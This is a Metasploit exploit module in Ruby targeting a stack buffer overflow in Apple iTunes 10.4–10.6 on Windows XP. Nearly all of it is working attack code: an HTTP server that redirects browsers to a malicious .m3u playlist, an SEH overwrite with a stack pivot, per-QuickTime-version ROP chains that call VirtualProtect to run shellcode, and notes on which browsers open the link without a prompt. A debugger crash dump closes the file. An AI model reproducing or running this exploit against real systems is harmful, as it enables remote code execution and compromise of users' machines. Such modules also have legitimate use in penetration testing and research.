##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apple iTunes 10 Extended M3U Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in iTunes 10.4.0.80 to 10.6.1.7.
				When opening an extended .m3u file containing an "#EXTINF:" tag description,
				iTunes will copy the content after "#EXTINF:" without appropriate checking
				from a heap buffer to a stack buffer, writing beyond the stack buffer's boundary,
				which allows code execution under the context of the user.

				Please note before using this exploit, you must have precise knowledge of the
				victim machine's QuickTime version (if installed), and then select your target
				accordingly.

				In addition, even though this exploit can be used as remote, you should be aware
				the victim's browser behavior when opening an itms link.  For example,
				IE/Firefox/Opera by default will ask the user for permission before launching the
				itms link by iTunes.  Chrome will ask for permission, but also spits a warning.
				Safari would be an ideal target, because it will open the link without any
				user interaction.
			},
			'Author'         =>
				[
					'Rh0 <rh0[at]z1p.biz>',  # discovery and metasploit module
					'sinn3r'                 #Mo' targets & code cleanup, etc
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => ['win'],
			'Arch'           => ARCH_X86,
			'Payload'        =>
				{
					'Space'          => 1000,
					'BadChars'       => "\x00\x0a\x0d",
					'DisableNops'    => true,
					'PrependEncoder' => "\x81\xc4\xfc\xfb\xff\xff" # ADD ESP, -0x404
				},
			'References'     =>
				[
					[ 'EDB', '19322' ]
				],
			'DisclosureDate' => "Jun 21 2012",
			'Targets'        =>
				[
					# Default package for iTunesSetup104.exe
					['iTunes 10.4.0.80 to 10.6.1.7 with QuickTime 7.69 on XP SP3',
						{
							'Ret'     => 0x669C197B, # ADD ESP,0xD40 / ret [QuickTime.qts]
							'ROP_NOP' => 0x66801044  # RET
						}
					],
					# Default package for iTunesSetup1041.exe
					[ 'iTunes 10.4.0.80 to 10.6.1.7 with QuickTime 7.70 on XP SP3',
						{
							'Ret'     => 0x6693A96B, # ADD ESP,0xD40 / ret [QuickTime.qts]
							'ROP_NOP' => 0x66801044  # RET
						}
					],
					[ 'iTunes 10.4.0.80 to 10.6.1.7 with QuickTime 7.71 on XP SP3',
						{
							'Ret'     => 0x6693ACBB, # ADD ESP,0xD40 / ret [QuickTime.qts]
							'ROP_NOP' => 0x66801044  # RET
						}
					],
					['iTunes 10.4.0.80 to 10.6.1.7 with QuickTime 7.72 on XP SP3',
						{
							'Ret'     => 0x6693afab, # ADD ESP,0xD40 / ret [QuickTime.qts]
							'ROP_NOP' => 0x66801044  # RET
						}
					]
				]
		))
	end


	def on_request_uri(cli,request)
		# re-generate the payload
		return if ((p = regenerate_payload(cli).encoded) == nil)

		host = request.headers['HOST']
		agent = request.headers['USER-AGENT']

		# iTunes browser link
		m3u_location = "itms://#{host}#{get_resource()}/#{rand_text_alphanumeric(8+rand(8))}.m3u"

		if request.uri =~ /\.ico$/i
			# Discard requests for ico files
			send_not_found(cli)
		elsif request.uri =~ /\.m3u$/i
			print_status("Target: #{target.name}")
			print_status("Sending playlist")
			send_response(cli, generate_m3u(p), { 'Content-Type' => 'audio/x-mpegurl' })
		elsif agent =~ /MSIE (6|7|8)\.0/ and agent =~ /NT 5\.1/
			print_status("Redirecting to playlist")
			send_response(cli, generate_redirect_ie(m3u_location), { 'Content-Type' => 'text/html' })
		elsif agent =~ /NT 5\.1/
			# redirect Firefox, Chrome, Opera, Safari to iTunes link
			print_status("Redirecting to playlist")
			send_redirect(cli, m3u_location)
		else
			print_status("Unknown User-Agent: #{agent}")
			send_not_found(cli)
		end
	end


	# IE did not proper redirect when retrieving an itms:// location redirect via a HTTP header...
	# ... so use html
	def generate_redirect_ie(m3u_location)
		ie_redir = <<-HTML_REDIR
			<!DOCTYPE HTML>
			<html>
			<head>
			<meta http-equiv="refresh" content="0; URL=#{m3u_location}">
			</head>
			</html>
		HTML_REDIR

		ie_redir = ie_redir.gsub(/^\t\t\t/, '')

		return ie_redir
	end


	def generate_m3u(payload)
		# Bypass stack cookies by triggering a SEH exception before
		# the cookie gets checked. SafeSEH is bypassed by using a non
		# safeSEH DLL [QuickTime.qts].

		# stack buffer overflow ->
		# overwrite SEH handler ->
		# trigger SEH exception ->
		# rewind stack (ADD ESP, ...) and land in ROP NOP sled	->
		# virtualprotect and execute shellcode

		m3u = '#EXTINF:,'

		# stack layout depends on what iTunes is doing (running or not, playing music etc.) ...
		# ... so ensure we overwrite a SEH handler to get back to our rop chain
		m3u << [target.ret].pack("V") * 0x6a       # stack pivot/rewind
		m3u << [target['ROP_NOP']].pack("V") * 30  # ROP NOP sled
		m3u << gimme_rop
		m3u << payload

		# 0x1000 should be enough to overflow the stack and trigger SEH
		m3u << rand_text_alphanumeric(0x1000 - m3u.length)

		return m3u

	end


	def gimme_rop
		# thanx to mona.py :)
		rop_chain = [
			:popad,
			# registers
			0x66801044,  # EDI: RET
			0x7c801ad4,  # ESI: VirtualProtect [kernel32.dll]
			:jmpesp,
			junk,
			:ebx,        # EBX: Becomes 0x3e8
			0xffffffd6,  # EDX: Becomes 0x40
			0x673650b0,  # ECX: lpflOldProtect
			0x90909090,  #EAX
			# correct dwSize and flNewProtect
			:modebx,
			:addedx,
			# throw it on the stack
			:pushad
		]

		# Map gadgets to a specific Quicktime version
		rop_chain.map! { |g|
			case target.name
			when /QuickTime 7\.69/
				case g
				when :popad  then 0x66C3E260
				when :jmpesp then 0x669F6E21
				when :ebx    then 0x4CC48017
				when :modebx then 0x669A8648  # xor ebx,4CC483FF; ret
				when :addedx then 0x669FC1C6  # add edx, 0x6a; ret
				when :pushad then 0x6682A67E
				else
					g
				end

			when /QuickTime 7\.70/
				case g
				when :popad  then 0x66926F5B
				when :jmpesp then 0x66d6b743
				when :ebx    then 0x6c1703e8
				when :modebx then 0x66b7d8cb  # add ebx, 0x93E90000 ; ret
				when :addedx then 0x66975556  # add edx, 0x6a; ret
				when :pushad then 0x6689B829
				else
					g
				end

			when /QuickTime 7\.71/
				case g
				when :popad  then 0x668E2BAA
				when :jmpesp then 0x66965F78
				when :ebx    then 0x6c1703e8
				when :modebx then 0x66B7DC4B  # add ebx, 0x93E90000 ; ret
				when :addedx then 0x66975956  # add edx, 0x6a; ret
				when :pushad then 0x66C28B70
				else
					g
				end

			when /QuickTime 7\.72/
				case g
				when :popad  then 0x66c9a6c0
				when :jmpesp then 0x6697aa03
				when :ebx    then 0x6c1703e8
				when :modebx then 0x66b7de1b  # add ebx, 0x93E90000 ; ret
				when :addedx then 0x66975c56  # add edx, 0x6a; ret
				when :pushad then 0x6684b5c6
				else
					g
				end
			end
		}

		rop_chain.pack("V*")
	end


	def junk
		rand_text_alpha(4).unpack("L")[0].to_i
	end

end

=begin
0:000> r
eax=0e5eb6a0 ebx=00000000 ecx=00000183 edx=00000003 esi=0e5eb091 edi=00130000
eip=10ceaa7a esp=0012ee5c ebp=0012ee64 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
iTunes_10000000!iTunesMainEntryPoint+0xb93f3a:
10ceaa7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:000> k
ChildEBP RetAddr
WARNING: Stack unwind information not available. Following frames may be wrong.
0012ee64 10356284 iTunes_10000000!iTunesMainEntryPoint+0xb93f3a
0012eea4 1035657c iTunes_10000000!iTunesMainEntryPoint+0x1ff744
0012eed8 1034de49 iTunes_10000000!iTunesMainEntryPoint+0x1ffa3c
00000000 00000000 iTunes_10000000!iTunesMainEntryPoint+0x1f7309
0:000> !address esi
    0c720000 : 0d87d000 - 00ea3000
                    Type     00020000 MEM_PRIVATE
                    Protect  00000004 PAGE_READWRITE
                    State    00001000 MEM_COMMIT
                    Usage    RegionUsageHeap
                    Handle   0c720000
0:000> !address edi-10
    00030000 : 000ee000 - 00042000
                    Type     00020000 MEM_PRIVATE
                    Protect  00000004 PAGE_READWRITE
                    State    00001000 MEM_COMMIT
                    Usage    RegionUsageStack
                    Pid.Tid  d1c.d0c
=end
